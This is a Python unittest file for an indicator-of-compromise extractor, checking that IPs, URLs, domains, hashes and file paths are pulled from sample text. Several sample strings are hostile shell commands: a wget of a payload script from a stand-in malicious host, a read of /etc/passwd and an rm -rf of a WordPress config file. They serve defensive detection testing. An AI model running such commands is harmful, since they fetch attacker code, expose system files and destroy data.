import unittest
from extractor import extract_iocs

class TestExtractor(unittest.TestCase):
    def test_extract_ips(self):
        text = "ping 8.8.8.8 and also 1.2.3.4"
        iocs = extract_iocs(text)
        ips = [ioc['value'] for ioc in iocs if ioc['ioc_type'] == 'ip']
        self.assertIn('8.8.8.8', ips)
        self.assertIn('1.2.3.4', ips)
        self.assertNotIn('127.0.0.1', ips) # shouldn't extract loopback if it existed

    def test_extract_urls(self):
        text = "wget http://malicious.com/payload.sh"
        iocs = extract_iocs(text)
        urls = [ioc['value'] for ioc in iocs if ioc['ioc_type'] == 'url']
        self.assertIn('http://malicious.com/payload.sh', urls)
        
    def test_extract_domains(self):
        text = "nslookup evil-domain.org"
        iocs = extract_iocs(text)
        domains = [ioc['value'] for ioc in iocs if ioc['ioc_type'] == 'domain']
        self.assertIn('evil-domain.org', domains)

    def test_extract_hashes(self):
        text = "md5 is d41d8cd98f00b204e9800998ecf8427e and sha256 is e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        iocs = extract_iocs(text)
        hash_md5 = [ioc['value'] for ioc in iocs if ioc['ioc_type'] == 'hash:md5']
        hash_sha256 = [ioc['value'] for ioc in iocs if ioc['ioc_type'] == 'hash:sha256']
        self.assertIn('d41d8cd98f00b204e9800998ecf8427e', hash_md5)
        self.assertIn('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', hash_sha256)

    def test_extract_filepaths(self):
        text = "cat /etc/passwd and rm -rf /var/www/html/wp-config.php"
        iocs = extract_iocs(text)
        paths = [ioc['value'] for ioc in iocs if ioc['ioc_type'] == 'filepath']
        self.assertIn('/etc/passwd', paths)
        self.assertIn('/var/www/html/wp-config.php', paths)

if __name__ == '__main__':
    unittest.main()
